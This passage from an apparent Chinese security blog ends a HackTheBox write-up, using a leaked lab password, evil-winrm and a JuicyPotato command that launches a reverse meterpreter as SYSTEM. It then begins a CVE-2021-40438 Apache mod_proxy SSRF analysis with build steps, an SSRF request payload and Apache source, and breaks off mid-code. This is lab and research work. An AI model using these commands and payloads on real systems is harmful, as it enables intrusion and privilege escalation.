src="https://pic.imgdb.cn/item/6462a06c0d2dde577704feac.jpg"></a></p><p>在C:\DB_backups目录下发现一个名叫db_backup.ps1的文件，尝试读取：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">db_backup.ps1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Work in progress database backup script. Adapting from mysql backup script. Does not work yet. Do not use.</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$password</span> = <span class="string">&#x27;Alltheleavesarebrown1&#x27;</span></span><br><span class="line"><span class="variable">$user</span> = <span class="string">&#x27;sophie&#x27;</span></span><br><span class="line"><span class="variable">$cred</span> = <span class="built_in">New-Object</span> System.Net.NetworkCredential(<span class="variable">$user</span>, <span class="variable">$password</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$date</span> = <span class="built_in">Get-Date</span></span><br><span class="line"><span class="variable">$dateString</span> = <span class="variable">$date</span>.Year.ToString() + <span class="string">&quot;-&quot;</span> + <span class="variable">$date</span>.Month.ToString() + <span class="string">&quot;-&quot;</span> + <span class="variable">$date</span>.Day.ToString()</span><br><span class="line"></span><br><span class="line"><span class="comment">#Create symbolic link for sqldump.exe in the script folder</span></span><br><span class="line"><span class="variable">$sqldumpLocation</span> = \.sqldump.exe</span><br><span class="line"><span class="variable">$backupDest</span> = C:\DB_backups\SQL\sql_backup_<span class="string">&quot;+ <span class="variable">$dateString</span> + &quot;</span>.sql<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="variable">$execute_sqldump</span> = <span class="variable">$sqldumpLocation</span>+&quot;</span> <span class="literal">-u</span><span class="string">&quot;+<span class="variable">$cred</span>.UserName+&quot;</span> <span class="literal">-p</span><span class="string">&quot;+<span class="variable">$cred</span>.Password +&quot;</span> &gt; <span class="string">&quot; + <span class="variable">$backupDest</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">invoke-expression <span class="variable">$execute_sqldump</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># use 7zip to compress and encrypt the backup with same password as used to autheticate the sql backup user</span></span><br><span class="line"><span class="string"># removes the unencrypted .sql file afterwards</span></span><br><span class="line"><span class="string"># create symbolic link for 7z.exe in the script folder</span></span><br><span class="line"><span class="string"><span class="variable">$sevenzip</span> = &quot;</span>.<span class="comment">#7z.exe&quot;</span></span><br><span class="line"><span class="variable">$zipfile</span> = <span class="variable">$backupDest</span>.Replace(<span class="string">&quot;.sql&quot;</span>,<span class="string">&quot;.7z&quot;</span>)</span><br><span class="line"><span class="variable">$execute7zip</span> = <span class="variable">$sevenzip</span>+<span class="string">&quot; a -t7z &quot;</span>+<span class="variable">$zipfile</span>+<span class="string">&quot; &quot;</span>+<span class="variable">$backupDest</span>+<span class="string">&quot; -p&quot;</span>+<span class="variable">$cred</span>.Password</span><br><span class="line"><span class="built_in">invoke-expression</span> <span class="variable">$execute7zip</span></span><br><span class="line"><span class="built_in">Remove-Item</span> <span class="variable">$backupDest</span></span><br></pre></td></tr></table></figure><p>找到一组系统密码<code>sophie:Alltheleavesarebrown1</code>，接着我们用evil-winrm连接一下：</p><p><a href="https://pic.imgdb.cn/item/6462a1390d2dde5777056a7b.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462a1390d2dde5777056a7b.jpg"></a></p><p>连接成功，在Users目录下看到flag。</p><h3 id="I-prefer-mine-with-the-skins-on"><a href="#I-prefer-mine-with-the-skins-on" class="headerlink" title="I prefer mine with the skins on"></a>I prefer mine with the skins on</h3><p>接下来我们执行一下<code>whoami /all</code>：</p><p><a href="https://pic.imgdb.cn/item/6462a16b0d2dde57770580e7.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462a16b0d2dde57770580e7.jpg"></a></p><p>发现该用户有SeAssignPrimaryTokenPrivilege特权。我们知道令牌创建进程使用的CreateProcessAsUserA这个API要求用户必须拥有SeAssignPrimaryTokenPrivilege特权，因此接下来我们可以进行令牌窃取以提升至system权限。我这里使用的工具是juicy potato。首先上传juicy potato和msf生成的马，之后执行以下命令反弹meterpreter：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe /c <span class="string">&quot;JuicyPotato.exe -t u -p C:\Users\sophie\Documents\shell-1243.exe -l 1243 -c &#123;F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>因为我们使用的是CreateProcessAsUserA这个API，因此-t参数的值为u，-c参数为对应操作系统的COM对象的CLSID，这台主机是windows server 2016的，可以选择的对象有COMXblGameSave，其CLSID为{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}。 至此，最后一台主机的system权限也已经拿到了。打完，收工！</p><h2 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h2><p>最后贴一波证书吧：</p><p><a href="https://pic.imgdb.cn/item/6462a9f50d2dde57770cfe53.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462a9f50d2dde57770cfe53.jpg"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> hackthebox </tag>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-40438 Apache mod_proxy SSRF</title>
      <link href="/2023/04/15/apacheSSRF/"/>
      <url>/2023/04/15/apacheSSRF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近开始深入了解一些Web服务器的漏洞，感觉Apache mod_proxy SSRF这个漏洞还是很值得深究的。一方面是为了学习Apache的调试知识，还有一方面是检验一下自身的C语言水平。</p><h2 id="Apache调试之路"><a href="#Apache调试之路" class="headerlink" title="Apache调试之路"></a>Apache调试之路</h2><p>这里我的调试方式是远程调试，主机和虚拟机信息如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">宿主机：Windows11       (192.168.135.1)</span><br><span class="line">虚拟机：Ubuntu22.04     (192.168.135.138)</span><br></pre></td></tr></table></figure><p>Apache是用C编写的Web服务器，很难像Tomcat这种用java写的服务器那样很方便地调试。在分析Apache mod_proxy SSRF之前，我们首先需要编译、调试这个漏洞所需要的Apache。在调试之前，首先安装依赖，包括我们编译软件所需要的build-essential，以及调试C程序所需要的gdb，以及Apache所依赖的几个第三方库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install build-essential gdb</span><br><span class="line">sudo apt-get install --no-install-recommends libapr1-dev libaprutil1-dev libpcre3-dev</span><br></pre></td></tr></table></figure><p>在编译Apache之前，我们还需要安装ARP依赖，这是因为这个SSRF漏洞的有一些关键的过程是在apr这个依赖里。完整的APR(Apache portable Run-time libraries，Apache可移植运行库)实际上包含了三个开发包：apr、apr-util以及apr-iconv，每一个开发包分别独立开发，并拥有自己的版本。apr-util该目录中也是包含了一些常用的开发组件。这些组件与apr目录下的相比，它们与apache的关系更加密切一些。比如存储段和存储段组，加密等等。但是这里我们只需要apr和apr-util这两个安装包。</p><p>apr-util安装依赖于apr，因此需要首先安装apr-1.6.5：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https://dlcdn.apache.org/apr/apr-1.6.5.tar.gz <span class="comment">#下载apr-1.6.5源码</span></span><br><span class="line">tar -zxvf apr-1.6.5.tar.gz</span><br><span class="line"><span class="built_in">cd</span> apr-1.6.5/</span><br><span class="line">CLFAGS=<span class="string">&quot;-g&quot;</span> ./configure --prefix=/home/rainb0w/workspace/apr-1.6.5/</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>安装apr-util：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https://dlcdn.apache.org/apr/apr-util-1.6.3.tar.gz</span><br><span class="line">tar -zxvf apr-util-1.6.3.tar.gz</span><br><span class="line"><span class="built_in">cd</span> apr-util-1.6.3/</span><br><span class="line">CLFAGS=<span class="string">&quot;-g&quot;</span> ./configure --prefix=/home/rainb0w/workspace/apr-util-1.6.3 --with-apr=/home/rainb0w/workspace/apr-1.6.5/</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>因为CVE-2021-40438已经在Apache HTTP Server 2.4.49及更高版本中修补，所以我们需要找到低版本的Apache进行编译，直接到官网下载：<a href="https://archive.apache.org/dist/httpd/">https://archive.apache.org/dist/httpd/</a>，下载后解压：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://archive.apache.org/dist/httpd/httpd-2.4.43.tar.gz</span><br><span class="line">tar -zxvf httpd-2.4.43.tar.gz</span><br></pre></td></tr></table></figure><p>我的目录为：&#x2F;home&#x2F;rainb0w&#x2F;workspace&#x2F;httpd-2.4.43</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/rainb0w/workspace/httpd-2.4.43</span><br><span class="line">CFLAGS=<span class="string">&quot;-g&quot;</span> ./configure --prefix=/home/rainb0w/workspace/httpd-2.4.43/ --with-apr=/home/rainb0w/workspace/apr-1.6.5/ --with-apr-util=/home/rainb0w/workspace/apr-util-1.6.3/</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>这是我安装之后的目录结构：</p><p><a href="https://pic.imgdb.cn/item/642c7ddaa682492fcc209370.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642c7ddaa682492fcc209370.jpg"></a></p><p>根据披露出的漏洞细节可以得知，该漏洞是由于mod_proxy 将请求转发到远程用户选择的源服务器，因此我们需要先配置一个反向代理。</p><p>首先将proxy_module和proxy_http_module这两个模块前的注释去掉：</p><p><a href="https://pic.imgdb.cn/item/642c7defa682492fcc20aaa3.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642c7defa682492fcc20aaa3.jpg"></a></p><p>之后增加一个虚拟主机的配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *&gt;</span><br><span class="line">        ServerAdmin webmaster@localhost</span><br><span class="line">        ServerName localhost</span><br><span class="line">        DocumentRoot /home/rainb0w/workspace/httpd-2.4.43/htdocs</span><br><span class="line">        LogLevel notice proxy:trace8</span><br><span class="line">        ErrorLog /home/rainb0w/workspace/httpd-2.4.43/logs/error.log</span><br><span class="line">        CustomLog /home/rainb0w/workspace/httpd-2.4.43/logs/access.log combined</span><br><span class="line">        ProxyPass / &quot;http://192.168.135.1/&quot;</span><br><span class="line">        ProxyPassReverse / &quot;http://192.168.135.1/&quot;</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure><p>这里反代的地址是我宿主机的，需要改成自己的。DocumentRoot、ErrorLog和CustomLog也都要改成自己的，不然会报错。之后我们在&#x2F;home&#x2F;rainb0w&#x2F;workspace&#x2F;httpd-2.4.43目录下创建一个目录.vscode，在.vscode目录下创建一个文件，文件名为launch.json，文件值如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    // Use IntelliSense to learn about possible attributes.</span><br><span class="line">    // Hover to view descriptions of existing attributes.</span><br><span class="line">    // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387</span><br><span class="line">    &quot;version&quot;: &quot;0.2.0&quot;,</span><br><span class="line">    &quot;configurations&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;(gdb) Launch&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;cppdbg&quot;,</span><br><span class="line">            &quot;request&quot;: &quot;launch&quot;,</span><br><span class="line">            &quot;program&quot;: &quot;/home/rainb0w/workspace/httpd-2.4.43/bin/httpd&quot;,</span><br><span class="line">            &quot;args&quot;: [&quot;-X&quot;, &quot;-DFOREGROUND&quot;],</span><br><span class="line">            &quot;stopAtEntry&quot;: false,</span><br><span class="line">            &quot;cwd&quot;: &quot;/home/rainb0w/workspace/httpd-2.4.43&quot;,</span><br><span class="line">            &quot;environment&quot;: [],</span><br><span class="line">            &quot;externalConsole&quot;: false,</span><br><span class="line">            &quot;MIMode&quot;: &quot;gdb&quot;,</span><br><span class="line">            &quot;setupCommands&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;description&quot;: &quot;Enable pretty-printing for gdb&quot;,</span><br><span class="line">                    &quot;text&quot;: &quot;-enable-pretty-printing&quot;,</span><br><span class="line">                    &quot;ignoreFailures&quot;: true</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>program是需要调制的二进制文件，cwd是指 定运行时的目录，都需要改成自己的。之后在虚拟机中安装openssh-server，确保宿主机可以使用ssh登陆到root。</p><p>接着在vscode中，安装Remote - SSH扩展，添加一个远程服务器，如下：</p><p><a href="https://pic.imgdb.cn/item/642c7e04a682492fcc20c37f.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642c7e04a682492fcc20c37f.jpg"></a></p><p>接着安装调试C所需要的扩展：C&#x2F;C++（<a href="https://marketplace.visualstudio.com/items?itemName=ms-vscode.cpptools">https://marketplace.visualstudio.com/items?itemName=ms-vscode.cpptools</a>）</p><p>最后在源码中找到需要调试的部分，打下断点，即可远程调试。</p><h2 id="Apache-mod-proxy-SSRF漏洞分析"><a href="#Apache-mod-proxy-SSRF漏洞分析" class="headerlink" title="Apache mod_proxy SSRF漏洞分析"></a>Apache mod_proxy SSRF漏洞分析</h2><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>我本地的环境：</p><p><a href="http://192.168.135.138/%EF%BC%9A">http://192.168.135.138/：</a></p><p><a href="https://pic.imgdb.cn/item/642c7e25a682492fcc20e58d.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642c7e25a682492fcc20e58d.jpg"></a></p><p>访问&#x2F;1.txt：</p><p><a href="https://pic.imgdb.cn/item/642c7e3aa682492fcc20fbb9.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642c7e3aa682492fcc20fbb9.jpg"></a></p><p>接着给出payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET http://192.168.135.138/?unix|http://127.0.0.1/1.txt HTTP/1.1</span><br><span class="line">Host: 192.168.135.138</span><br><span class="line">DNT: 1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果为：</p><p><a href="https://pic.imgdb.cn/item/642c7e4da682492fcc210e3b.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642c7e4da682492fcc210e3b.jpg"></a></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><blockquote><p>Apache在配置反代的后端服务器时，有两种情况：</p><ul><li><p>直接使用某个协议反代到某个IP和端口，比如<code>ProxyPass / &quot;http://localhost:8080&quot;</code></p></li><li><p>使用某个协议反代到unix套接字，比如<code>ProxyPass / &quot;unix:/var/run/www.sock|http://localhost:8080/&quot;</code></p></li></ul><p>第二种情况的设计我觉得不是很好，相当于让用户可以使用一个Apache自创的写法来配置后端地址。那么这时候就会涉及到parse的过程，需要将这种自创的语法转换成能兼容正常socket连接的结构，而fix_uds_filename函数就是做这个事情的。</p><p><a href="https://www.leavesongs.com/PENETRATION/apache-mod-proxy-ssrf-cve-2021-40438.html">https://www.leavesongs.com/PENETRATION/apache-mod-proxy-ssrf-cve-2021-40438.html</a></p></blockquote><p>漏洞点在modules&#x2F;proxy&#x2F;proxy_util.c的fix_uds_filename函数处：</p><p><a href="https://pic.imgdb.cn/item/642c7ec5a682492fcc21860f.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642c7ec5a682492fcc21860f.jpg"></a></p><p>首先我们需要知道r-&gt;filename是什么？因为反代后端是http、https协议的服务，因此我们在modules&#x2F;proxy&#x2F;mod_proxy_http.c的中找到定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">proxy_http_canon</span><span class="params">(request_rec *r, <span class="type">char</span> *url)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *host, *path, sport[<span class="number">7</span>];</span><br><span class="line">    <span class="type">char</span> *search = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *err;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *scheme;</span><br><span class="line">    <span class="type">apr_port_t</span> port, def_port;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ap_port_of_scheme() */</span></span><br><span class="line">    <span class="keyword">if</span> (strncasecmp(url, <span class="string">&quot;http:&quot;</span>, <span class="number">5</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        url += <span class="number">5</span>;</span><br><span class="line">        scheme = <span class="string">&quot;http&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strncasecmp(url, <span class="string">&quot;https:&quot;</span>, <span class="number">6</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        url += <span class="number">6</span>;</span><br><span class="line">        scheme = <span class="string">&quot;https&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> DECLINED;</span><br><span class="line">    &#125;</span><br><span class="line">    port = def_port = ap_proxy_port_of_scheme(scheme);</span><br><span class="line"></span><br><span class="line">    ap_log_rerror(APLOG_MARK, APLOG_TRACE1, <span class="number">0</span>, r,</span><br><span class="line">                  <span class="string">&quot;HTTP: canonicalising URL %s&quot;</span>, url);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* do syntatic check.</span></span><br><span class="line"><span class="comment">     * We break the URL into host, port, path, search</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    err = ap_proxy_canon_netloc(r-&gt;pool, &amp;url, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;host, &amp;port);</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        ap_log_rerror(APLOG_MARK, APLOG_ERR, <span class="number">0</span>, r, APLOGNO(<span class="number">01083</span>)</span><br><span class="line">                      <span class="string">&quot;error parsing URL %s: %s&quot;</span>, url, err);</span><br><span class="line">        <span class="keyword">return</span> HTTP_BAD_REQUEST;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * now parse path/search args, according to rfc1738:</span></span><br><span class="line"><span class="comment">     * process the path.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * In a reverse proxy, our URL has been processed, so canonicalise</span></span><br><span class="line"><span class="comment">     * unless proxy-nocanon is set to say it&#x27;s raw</span></span><br><span class="line"><span class="comment">     * In a forward proxy, we have and MUST NOT MANGLE the original.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">switch</span> (r-&gt;proxyreq) &#123;</span><br><span class="line">    <span class="keyword">default</span>: <span class="comment">/* wtf are we doing here? */</span></span><br><span class="line">    <span class="keyword">case</span> PROXYREQ_REVERSE:</span><br><span class="line">        <span class="keyword">if</span> (apr_table_get(r-&gt;notes, <span class="string">&quot;proxy-nocanon&quot;</span>)) &#123;</span><br><span class="line">            path = url;   <span class="comment">/* this is the raw path */</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            path = ap_proxy_canonenc(r-&gt;pool, url, <span class="built_in">strlen</span>(url),</span><br><span class="line">                                     enc_path, <span class="number">0</span>, r-&gt;proxyreq);</span><br><span class="line">            search = r-&gt;args;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> PROXYREQ_PROXY:</span><br><span class="line">        path = url;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (path == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> HTTP_BAD_REQUEST;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (port != def_port)</span><br><span class="line">        apr_snprintf(sport, <span class="keyword">sizeof</span>(sport), <span class="string">&quot;:%d&quot;</span>, port);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        sport[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ap_strchr_c(host, <span class="string">&#x27;:&#x27;</span>)) &#123; <span class="comment">/* if literal IPv6 address */</span></span><br><span class="line">        host = apr_pstrcat(r-&gt;pool, <span class="string">&quot;[&quot;</span>, host, <span class="string">&quot;]&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    r-&gt;filename = apr_pstrcat(r-&gt;pool, <span class="string">&quot;proxy:&quot;</span>, scheme, <span class="string">&quot;://&quot;</span>, host, sport,</span><br><span class="line">            <span class="string">&quot;/&quot;</span>, path, (search) ? <span class="string">&quot;?&quot;</span> : <span class="string">&quot;&quot;</span>, (search) ? search : <span class="string">&quot;&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>审计代码可以发现，首先判断了url是否是<code>http:</code>或<code>https:</code>，若不是，则返回-1。之后，还获取了schema和port，接着调用ap_proxy_canon_netloc函数，若存在某些错误，则写入日志，并返回HTTP_BAD_REQUEST，也就是400：</p><p><a href="https://pic.imgdb.cn/item/642c7edfa682492fcc219ce3.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642c7edfa682492fcc219ce3.jpg"></a></p><p>接着依次获取sport，path，search，最后调用apr_pstrcat函数拼接<code>proxy:</code>、scheme、<code>://</code>、host、sport、<code>/</code>、path、?、search，其中<code>?</code>是存在search时才会拼接进去的。最后将拼接的值赋给r-&gt;filename。</p><p>在modules&#x2F;proxy&#x2F;mod_proxy_http.c的111行打下断点，发送payload可以看到得到的变量值：</p><p><a href="https://pic.imgdb.cn/item/642c7ef2a682492fcc21aac4.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642c7ef2a682492fcc21aac4.jpg"></a></p><p>接着程序走到modules&#x2F;proxy&#x2F;proxy_util.c的fix_uds_filename函数处：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">fix_uds_filename</span><span class="params">(request_rec *r, <span class="type">char</span> **url)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *ptr, *ptr2;</span><br><span class="line">    <span class="keyword">if</span> (!r || !r-&gt;filename) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(r-&gt;filename, <span class="string">&quot;proxy:&quot;</span>, <span class="number">6</span>) &amp;&amp;</span><br><span class="line">            (ptr2 = ap_strcasestr(r-&gt;filename, <span class="string">&quot;unix:&quot;</span>)) &amp;&amp;</span><br><span class="line">            (ptr = ap_strchr(ptr2, <span class="string">&#x27;|&#x27;</span>))) &#123;</span><br><span class="line">        <span class="type">apr_uri_t</span> urisock;</span><br><span class="line">        <span class="type">apr_status_t</span> rv;</span><br><span class="line">        *ptr = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        rv = apr_uri_parse(r-&gt;pool, ptr2, &amp;urisock);</span><br><span class="line">        <span class="keyword">if</span> (rv == APR_SUCCESS) &#123;</span><br><span class="line">            <span class="type">char</span> *rurl = ptr+<span class="number">1</span>;</span><br><span class="line">            <span class="type">char</span> *sockpath = ap_runtime_dir_relative(r-&gt;pool, urisock.path);</span><br><span class="line">            